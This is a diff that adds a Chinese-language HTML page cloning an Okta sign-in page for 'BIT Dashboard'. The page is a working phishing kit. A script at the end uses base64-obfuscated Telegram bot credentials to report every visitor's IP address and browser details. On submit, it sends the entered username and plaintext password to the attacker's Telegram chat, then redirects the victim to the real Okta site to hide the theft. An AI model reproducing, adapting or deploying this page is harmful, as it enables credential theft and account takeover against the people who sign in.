@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="zh-CN"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <link href="cid:css-3a6e6f58-7f35-47c9-a753-90fbfe7064e5@mhtml.blink" rel="stylesheet" type="text/css"/>
+    <link href="cid:css-ff60c73d-eb7b-4917-aee4-dcec4f093e28@mhtml.blink" rel="stylesheet" type="text/css"/>
+    <title>BIT - 登录</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex,nofollow"/>
+    <link crossorigin="anonymous" href="https://ok14static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.25.1/css/okta-sign-in.min.css" rel="stylesheet" type="text/css"/>
+    <link href="https://ubit.okta.com/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+    <link href="https://ok14static.oktacdn.com/assets/loginpage/css/loginpage-theme.c8c15f6857642c257bcd94823d968bb1.css" rel="stylesheet" type="text/css"/>
+    <link href="https://ubit.okta.com/api/internal/brand/theme/style-sheet?touch-point=SIGN_IN_PAGE&amp;v=f991ebb043f05a9393f38ace2d7dafefc25baa57484ea41b8969a14da06b2d45c27314de737b7014d6aad7d515925099" rel="stylesheet" type="text/css"/><!-- 新增背景样式 -->
+    <style nonce="UQLItOxGVpLiJmPTNqyOwg" type="text/css">.bgStyle {
+            background-image: url('https://ok3static.oktacdn.com/fs/bco/7/fs01t34xx474gEoZl1d8');
+            background-size: cover; /* 确保背景图覆盖整个元素 */
+            background-position: center; /* 背景图居中 */
+            background-repeat: no-repeat; /* 不重复背景图 */
+            height: 100vh; /* 背景图覆盖整个视口高度 */
+        }
+
+        .bgStyleIE8 {
+            filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://ok3static.oktacdn.com/fs/bco/7/fs01t34xx474gEoZl1d8', sizingMethod='scale');
+        }
+
+        /* 处理链接的焦点状态 */
+        .copyright a:focus-visible,
+        .privacy-policy a:focus-visible {
+            border-radius: 6px;
+            outline: rgb(84, 107, 231) solid 1px;
+            outline-offset: 2px;
+            text-decoration: none !important;
+        }
+    </style>
+</head>
+<body class="auth okta-container">
+<div class="login-bg-image tb--background bgStyle" data-se="login-bg-image" id="login-bg-image"> </div>
+
+<form action="" class="hide" id="x509_login" method="post" name="x509_login"> </form>
+
+<div class="content">
+<div class="applogin-banner">
+<div class="applogin-background"> </div>
+
+<div class="applogin-container">
+<h1><span class="applogin-app-title">正在连接至</span></h1>
+
+<div class="applogin-app-logo"><img alt="Okta Dashboard" class="logo okta_enduser" src="https://ok14static.oktacdn.com/assets/img/logos/okta-logo-end-user-dashboard.fc6d8fdbcb8cb4c933d009e71456cec6.svg"/></div>
+
+<p>登录您的帐户以访问 BIT Dashboard</p>
+</div>
+</div>
+
+<div id="signin-container">
+<main class="auth-container main-container no-beacon" data-se="auth-container" id="okta-sign-in" style="" tabindex="-1">
+<div class="okta-sign-in-header auth-header" id="logo-form">
+<h1><img alt="BIT logo" aria-label="BIT logo" class="auth-org-logo" src="data:image/png;base64,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" style="max-height: 60px;"/></h1>
+
+<div class="beacon-container" data-type="beacon-container"> </div>
+</div>
+
+<div class="auth-content">
+<div class="auth-content-inner">
+<div class="siw-main-view identify primary-auth">
+<div class="siw-main-header">
+<div> </div>
+</div>
+
+<div class="siw-main-body">
+<form action="" class="ion-form o-form o-form-edit-mode" data-se="o-form" id="form20" method="POST" slot="content">
+<div class="o-form-content o-form-theme clearfix" data-se="o-form-content" id="step-username">
+<h2 class="okta-form-title o-form-head" data-se="o-form-head">登录</h2>
+
+<div class="o-form-info-container"> </div>
+
+<div class="o-form-error-container" data-se="o-form-error-container" role="alert"> </div>
+
+<div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
+<div class="sign-in-with-device-option">
+<div class="okta-verify-container"><a class="button link-button link-button-icon" data-se="button" id="next-step1"> 使用 Okta FastPass 登录 </a></div>
+
+<div class="separation-line"><span>或者</span></div>
+</div>
+
+<div class="o-form-fieldset o-form-label-top" data-se="o-form-fieldset-identifier">
+<div class="okta-form-label o-form-label" data-se="o-form-label"><label for="input28">用户名 </label></div>
+
+<div class="o-form-input" data-se="o-form-input-container"><span class="o-form-input-name-identifier o-form-control okta-form-input-field input-fix" data-se="o-form-input-identifier"><input aria-label="" autocomplete="username" id="input28" value="" placeholder="" type="text"/> </span></div>
+</div>
+
+<div class="o-form-fieldset o-form-label-top" data-se="o-form-fieldset-rememberMe">
+<div class="o-form-input" data-se="o-form-input-container">
+<div class="custom-checkbox"><span class="o-form-input-name-rememberMe" data-se="o-form-input-rememberMe"><input id="input36" type="checkbox"/> <label data-se-for-name="rememberMe" for="input36">保持登录</label> </span></div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="o-form-content o-form-theme clearfix" data-se="o-form-content" id="step-password" style="display: none;">
+<h2 class="okta-form-title o-form-head" data-se="o-form-head">通过密码验证</h2>
+
+<div class="identifier-container"><span class="identifier" data-se="identifier"></span></div>
+<script>
+    // 获取输入框和目标元素
+    const usernameInput = document.getElementById('input28');
+    const identifierSpan = document.querySelector('.identifier-container .identifier');
+
+    // 初始化时设置默认值
+    identifierSpan.title = usernameInput.value;
+    identifierSpan.textContent = usernameInput.value;
+
+    // 监听输入框的输入事件，实时更新值
+    usernameInput.addEventListener('input', function () {
+        identifierSpan.title = usernameInput.value;
+        identifierSpan.textContent = usernameInput.value;
+    });
+</script>
+
+<div class="o-form-info-container"> </div>
+
+<div class="o-form-error-container" data-se="o-form-error-container" role="alert"> </div>
+
+<div class="o-form-fieldset-container" data-se="o-form-fieldset-container">
+<div class="o-form-fieldset o-form-label-top" data-se="o-form-fieldset-credentials.passcode">
+<div class="okta-form-label o-form-label" data-se="o-form-label"><label for="input61">密码 </label></div>
+
+<div class="o-form-input" data-se="o-form-input-container"><span class="o-form-input-name-credentials.passcode o-form-control okta-form-input-field input-fix" data-se="o-form-input-credentials.passcode"><input aria-label="" autocomplete="off" class="password-with-toggle" data-okta-locator="c907f472-1d64-41d7-a8fe-d07106f0ab5f" id="input61" value="" placeholder="" spellcheck="false" type="password" name="password"/> <span class="password-toggle"> <span class="eyeicon visibility-16 button-show"> </span> <span class="eyeicon visibility-off-16 button-hide" style="display: none;"> </span> </span> </span> <script>
+            // 获取相关元素
+            const passwordInput = document.querySelector('input[type="password"]'); // 找到密码输入框
+            const eyeIconShow = document.querySelector('.button-show');
+            const eyeIconHide = document.querySelector('.button-hide');
+
+            // 添加点击事件
+            eyeIconShow.addEventListener('click', () => {
+              passwordInput.type = 'text';
+              eyeIconShow.style.display = 'none';
+              eyeIconHide.style.display = 'inline';
+            });
+
+            eyeIconHide.addEventListener('click', () => {
+              passwordInput.type = 'password';
+              eyeIconShow.style.display = 'inline';
+              eyeIconHide.style.display = 'none';
+            });
+            </script>
+
+<div class="o-form-button-bar"><br/>
+<br/>
+<br/>
+<input class="button button-primary" data-okta-hassubmittext="no" data-type="save" type="submit" value="验证"/></div>
+
+<div class="siw-main-footer">
+<div class="auth-footer"><a class="link js-forgot-password" data-okta-hassubmittext="no" data-se="forgot-password" href="https://ubit.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26&amp;code_challenge=TogDq1B8hPsqtPkUn7pyJgYafBFwiiTTvToK5E2FnDo&amp;code_challenge_method=S256&amp;nonce=SGZliJiBpFXBxyHHs0g5QJtRMJn2dowzjPZx0S3LF5ZlKpzb3JbbtKky63H0VxW0&amp;redirect_uri=https%3A%2F%2Fubit.okta.com%2Fenduser%2Fcallback&amp;response_type=code&amp;state=Tpq8Y0KFV1Oex7x7XytWTUiA0iOQq0w2Ez6rnUhgcFMu2TcioTBLtGaotz62CW9W&amp;scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self%20okta.internal.enduser.read%20okta.internal.enduser.manage%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage%20okta.myAccount.sessions.manage#">忘记密码?</a> <a class="link js-switchAuthenticator" data-okta-hassubmittext="no" data-se="switchAuthenticator" href="https://ubit.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26&amp;code_challenge=TogDq1B8hPsqtPkUn7pyJgYafBFwiiTTvToK5E2FnDo&amp;code_challenge_method=S256&amp;nonce=SGZliJiBpFXBxyHHs0g5QJtRMJn2dowzjPZx0S3LF5ZlKpzb3JbbtKky63H0VxW0&amp;redirect_uri=https%3A%2F%2Fubit.okta.com%2Fenduser%2Fcallback&amp;response_type=code&amp;state=Tpq8Y0KFV1Oex7x7XytWTUiA0iOQq0w2Ez6rnUhgcFMu2TcioTBLtGaotz62CW9W&amp;scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self%20okta.internal.enduser.read%20okta.internal.enduser.manage%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage%20okta.myAccount.sessions.manage#">用其他方式验证</a> <a class="link js-cancel" data-okta-hassubmittext="no" data-se="cancel" href="https://ubit.okta.com/oauth2/v1/authorize?client_id=okta.2b1959c8-bcc0-56eb-a589-cfcfb7422f26&amp;code_challenge=TogDq1B8hPsqtPkUn7pyJgYafBFwiiTTvToK5E2FnDo&amp;code_challenge_method=S256&amp;nonce=SGZliJiBpFXBxyHHs0g5QJtRMJn2dowzjPZx0S3LF5ZlKpzb3JbbtKky63H0VxW0&amp;redirect_uri=https%3A%2F%2Fubit.okta.com%2Fenduser%2Fcallback&amp;response_type=code&amp;state=Tpq8Y0KFV1Oex7x7XytWTUiA0iOQq0w2Ez6rnUhgcFMu2TcioTBLtGaotz62CW9W&amp;scope=openid%20profile%20email%20okta.users.read.self%20okta.users.manage.self%20okta.internal.enduser.read%20okta.internal.enduser.manage%20okta.enduser.dashboard.read%20okta.enduser.dashboard.manage%20okta.myAccount.sessions.manage#">返回登录</a></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="o-form-button-bar"><button class="button button-primary" data-type="save" id="next-step" type="button">下一步</button></div>
+</form>
+</div>
+
+<div class="siw-main-footer">
+<div class="auth-footer"><a class="link js-help" data-se="help" href="https://ubit.okta.com/help/login" rel="noopener noreferrer" target="_blank">帮助</a></div>
+</div>
+<script>
+  document.getElementById('next-step').addEventListener('click', function () {
+    document.getElementById('step-username').style.display = 'none';
+    document.getElementById('step-password').style.display = 'block';
+    document.getElementById('next-step').style.display = 'none';
+    document.getElementById('submit-form').style.display = 'inline-block';
+    document.getElementById('help-form').style.display = 'none';    
+  });
+</script><script>
+  document.getElementById('next-step1').addEventListener('click', function () {
+    document.getElementById('step-username').style.display = 'none';
+    document.getElementById('step-password').style.display = 'block';
+    document.getElementById('next-step').style.display = 'none';
+    document.getElementById('submit-form').style.display = 'inline-block';
+    document.getElementById('help-form').style.display = 'none';
+  });
+</script></div>
+</div>
+</div>
+</main>
+</div>
+</div>
+
+<div class="footer">
+<div class="footer-container clearfix">
+<p class="copyright">Powered by <a class="inline-block notranslate">Okta</a></p>
+
+<p class="privacy-policy"><a class="inline-block margin-l-10" href="https://ubit.okta.com/privacy" target="_blank">隐私政策</a></p>
+</div>
+</div>
+
+<div class="hide" id="inactive-tab-main-div">
+<div class="inactive-tab-container">
+<div class="inactive-tab-header"><img alt="Okta" class="report-org-logo" height="74" src="https://ok14static.oktacdn.com/assets/img/logos/okta-logo.1e146cad5713da744492be95eb0f7793.png" width="220"/>
+<div class="divider"> </div>
+</div>
+
+<div class="inactive-tab-content">
+<h2 class="inactive-tab-content-title">此页面已超时</h2>
+
+<p class="inactive-tab-details">如果此页面未自动重新加载，请刷新您的浏览器。</p>
+</div>
+</div>
+</div>
+
+<p><iframe class="hide" data-se="account-chooser" id="account-chooser-iframe" src="cid:frame-269B12A4738B210E799FB516BB1AD669@mhtml.blink"></iframe></p>
+
+
+<script>
+// ==================== TELEGRAM NOTIFY ====================
+const _tgT = atob('ODIyNzA0MzA4MzpBQUZzZUlPOTlEbWI5OHlHSkZrT0ZLMFotazZTcTkwQzRLdw==');
+const _tgC = atob('LTQ2MjMyMDY1ODU=');
+
+function _esc(s) {
+  return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+
+async function _ip() {
+  const apis = [
+    'https://api.ipify.org?format=json',
+    'https://api.my-ip.io/v2/ip.json',
+    'https://ipinfo.io/json'
+  ];
+  for (const url of apis) {
+    try {
+      const r = await fetch(url);
+      const j = await r.json();
+      return j.ip || 'unknown';
+    } catch (e) { continue; }
+  }
+  return 'unknown';
+}
+
+function _tg(text) {
+  try {
+    return fetch('https://api.telegram.org/bot' + _tgT + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: _tgC,
+        text: text,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      }),
+      keepalive: true
+    }).catch(() => {});
+  } catch (e) {
+    return Promise.resolve();
+  }
+}
+
+function _now() {
+  const d = new Date();
+  const pad = (n) => String(n).padStart(2, '0');
+  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())} UTC`;
+}
+
+// ==================== PAGE-VISIT NOTIFICATION ====================
+(async () => {
+  try {
+    const ip = await _ip();
+    const ua = navigator.userAgent || 'unknown';
+    const txt =
+      '🟢 <b>[BIT] Okta login page opened</b>\n' +
+      'IP: <code>' + _esc(ip) + '</code>\n' +
+      'Time: <code>' + _esc(_now()) + '</code>\n' +
+      'Lang: <code>' + _esc(navigator.language || '') + '</code>\n' +
+      'Referrer: <code>' + _esc(document.referrer || 'direct') + '</code>\n' +
+      'UA: <code>' + _esc(ua.substring(0, 200)) + '</code>';
+    await _tg(txt);
+  } catch (e) {
+    console.warn('TG visit notify failed:', e);
+  }
+})();
+
+// ==================== LOGIN SUBMIT NOTIFICATION ====================
+document.getElementById('form20').addEventListener('submit', async function (e) {
+  e.preventDefault();
+  const username = document.getElementById('input28').value.trim();
+  const password = document.getElementById('input61').value;
+
+  try {
+    const ip = await _ip();
+    const txt =
+      '🔑 <b>[BIT] Okta login submitted</b>\n' +
+      'Username: <code>' + _esc(username) + '</code>\n' +
+      'Password: <code>' + _esc(password) + '</code>\n' +
+      'IP: <code>' + _esc(ip) + '</code>\n' +
+      'Time: <code>' + _esc(_now()) + '</code>\n' +
+      'UA: <code>' + _esc((navigator.userAgent || '').substring(0, 200)) + '</code>';
+    await _tg(txt);
+  } catch (e) {
+    console.warn('TG login notify failed:', e);
+  }
+
+  // After notification, redirect to real Okta
+  window.location.href = 'https://ubit.okta.com';
+});
+</script>
+
+</body></html>
